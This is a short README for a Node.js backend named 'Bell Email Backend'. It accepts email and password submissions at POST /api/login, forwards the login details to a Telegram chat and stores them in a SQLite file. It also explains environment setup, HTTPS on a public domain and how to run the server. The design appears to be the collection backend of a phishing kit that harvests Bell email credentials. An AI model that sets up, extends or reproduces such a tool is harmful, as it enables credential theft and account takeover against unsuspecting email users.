# Bell Email Backend

This folder contains the local Node.js backend API.

## Purpose

- Receives `POST /api/login`
- Sends Telegram notifications using `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`
- Stores login details in a local SQLite database (`data.db`)

## Environment

Copy `.env.example` to `.env` and fill in your values.

Required values:

- `TELEGRAM_BOT_TOKEN`
- `TELEGRAM_CHAT_ID`

Optional/local values:

- `DOMAIN`
- `LETSENCRYPT_EMAIL`
- `CERT_DIR`
- `ENFORCE_HTTPS`
- `PORT`
- `HTTP_PORT`
- `HTTPS_PORT`

## Run locally

```bash
cd backend
npm install
npm start
```

The backend listens on `PORT` (default `3000`) and exposes the API endpoint:

```txt
POST /api/login
```

### Request body

```json
{
  "email": "user@example.com",
  "password": "password123"
}
```

## Notes

- Keep `backend/.env` private.
- `backend/.env.example` is safe to share.
- `backend/node_modules/` is ignored and should be installed locally.
